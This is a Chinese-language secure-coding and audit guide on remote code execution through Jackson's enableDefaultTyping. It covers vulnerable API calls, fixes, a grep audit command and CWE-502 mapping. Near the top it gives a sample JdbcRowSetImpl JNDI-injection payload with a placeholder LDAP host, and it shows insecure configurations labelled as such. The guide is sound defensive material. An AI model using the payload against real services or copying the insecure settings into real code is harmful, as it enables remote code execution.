# Jackson enableDefaultTyping RCE

## 原理

Jackson 默认关闭多态类型。若显式打开 DefaultTyping，`@class` 字段进入反序列化决策，
等价于 Fastjson autoType：

```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://x/y","autoCommit":true}]
```

## 触发 API

```java
ObjectMapper mapper = new ObjectMapper();

// ❌ 三种打开方式
mapper.enableDefaultTyping();                                  // 全类型
mapper.enableDefaultTyping(DefaultTyping.NON_FINAL);           // 非 final 类
mapper.enableDefaultTyping(DefaultTyping.OBJECT_AND_NON_CONCRETE);

// ❌ 2.10+ 新 API 但 validator 太宽也危险
mapper.activateDefaultTyping(
    LaissezFaireSubTypeValidator.instance,  // ⚠️ 允许一切
    DefaultTyping.NON_FINAL
);
```

## 修复

### 保持默认关闭

```java
ObjectMapper mapper = new ObjectMapper();
// 不调用 enableDefaultTyping / activateDefaultTyping
```

### 必须多态时用 @JsonTypeInfo

```java
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, property = "kind")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Cat.class, name = "cat"),
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
})
public abstract class Animal {}
```

只允许预声明的子类，且用 `NAME` 而不是 `CLASS`（`CLASS` = `@class` = 等价 autoType）。

### 严格 SubTypeValidator（2.10+）

```java
PolymorphicTypeValidator validator = BasicPolymorphicTypeValidator.builder()
    .allowIfBaseType(Animal.class)
    .allowIfSubType("com.myapp.model.")
    .build();

mapper.activateDefaultTyping(validator, DefaultTyping.NON_FINAL);
```

### 版本

Jackson 2.10+ 引入 PolymorphicTypeValidator。Jackson 2.9 及以下的 enableDefaultTyping
基本没有安全保护，必须升级。

## 常见误区

### xNode/JsonNode 树模型不受影响

```java
JsonNode node = mapper.readTree(input);   // ✅ 不做类型推断
```

树模型永远返回 JsonNode，不实例化任意类。安全。

### readValue(input, Object.class) 同样危险

```java
Object obj = mapper.readValue(input, Object.class);
```

若开了 DefaultTyping，Object.class + JSON 有 `["fqn", ...]` → RCE。

### Spring 默认 ObjectMapper

Spring Boot 默认 ObjectMapper **不开** DefaultTyping。但如果业务自定义：

```java
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper m = new ObjectMapper();
    m.enableDefaultTyping();   // ❌ 全局灾难
    return m;
}
```

一旦这个 Bean 生效，`@RequestBody` 所有接口全部命中。

## 审计动作

```bash
grep -rn 'enableDefaultTyping\|activateDefaultTyping' src/main/java/
```

- 有 `LaissezFaireSubTypeValidator` = 高危
- 有 `BasicPolymorphicTypeValidator.builder().allowIfSubType("")` （空串或 "*"）= 高危

## 相关规则

- CWE: CWE-502
- 内建 pattern: `jackson_default_typing`
- CVSS: 9.8
